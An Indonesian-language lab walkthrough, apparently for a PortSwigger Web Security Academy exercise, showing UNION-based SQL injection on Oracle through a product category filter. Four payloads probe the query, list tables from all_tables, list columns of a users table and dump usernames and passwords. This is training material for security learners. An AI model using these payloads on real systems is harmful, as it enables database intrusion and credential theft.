# SQL Injection Attack: Listing the Database Contents on Oracle

Lab ini mengandung kerentanannya dalam SQL injection pada filter kategori produk. Hasil dari query dikembalikan dalam respons aplikasi, sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain.

Aplikasi ini memiliki fungsi login, dan database berisi sebuah tabel yang menyimpan nama pengguna dan kata sandi. Anda perlu menentukan nama tabel ini dan kolom yang ada di dalamnya, lalu mengambil isi tabel untuk mendapatkan nama pengguna dan kata sandi semua pengguna.

Untuk menyelesaikan lab ini, login sebagai pengguna administrator.

### **Petunjuk**
Pada database Oracle, setiap pernyataan SELECT harus menentukan tabel yang akan dipilih. Jika serangan UNION SELECT Anda tidak mengambil data dari tabel, Anda tetap perlu menambahkan kata kunci `FROM` yang diikuti oleh tabel yang valid.

Tabel bawaan di Oracle yang dapat digunakan adalah `dual`. Contoh: `UNION SELECT 'abc' FROM dual`.

---

### **Langkah-langkah Melakukan Serangan**

#### **Langkah 1: Menyuntikkan Payload untuk Menampilkan Data**
Pertama, kita dapat mengonfirmasi jumlah kolom dalam query dengan menggunakan payload berikut:
```
/filter?category=Pets'--
```
Query ini mungkin menghasilkan dua kolom: `description` dan `content`.

#### **Langkah 2: Menyusun Serangan UNION untuk Menampilkan Tabel**
Karena kita menggunakan Oracle, kita harus menyertakan `FROM dual` dalam serangan UNION. Untuk menampilkan nama tabel, kita dapat menyuntikkan:
```
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
```
Ini akan menghasilkan daftar tabel dalam database.

#### **Langkah 3: Menampilkan Kolom dalam Tabel**
Setelah menemukan tabel `USERS_XWRQEE`, kita bisa mengetahui kolom yang ada di dalamnya dengan menyuntikkan:
```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+='USERS_XWRQEE'--
```
Ini akan menampilkan nama kolom dalam tabel `USERS_XWRQEE`.

#### **Langkah 4: Menampilkan Konten Tabel**
Setelah mengetahui kolom yang ada di dalam tabel `USERS_XWRQEE`, kita bisa menampilkan username dan password dengan payload berikut:
```
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```

---

### **Referensi**

- [Examining the Database Using SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### **Ilustrasi**

#### **Tampilan Awal (Deskripsi dan Konten Postingan)**:
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/1.png)

#### **Menampilkan Daftar Tabel (all_tables)**:
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/2.png)

#### **Menampilkan Kolom dalam Tabel `USERS_XWRQEE`**:
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/3.png)

#### **Menampilkan Konten Tabel (username dan password)**:
![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/4.png)
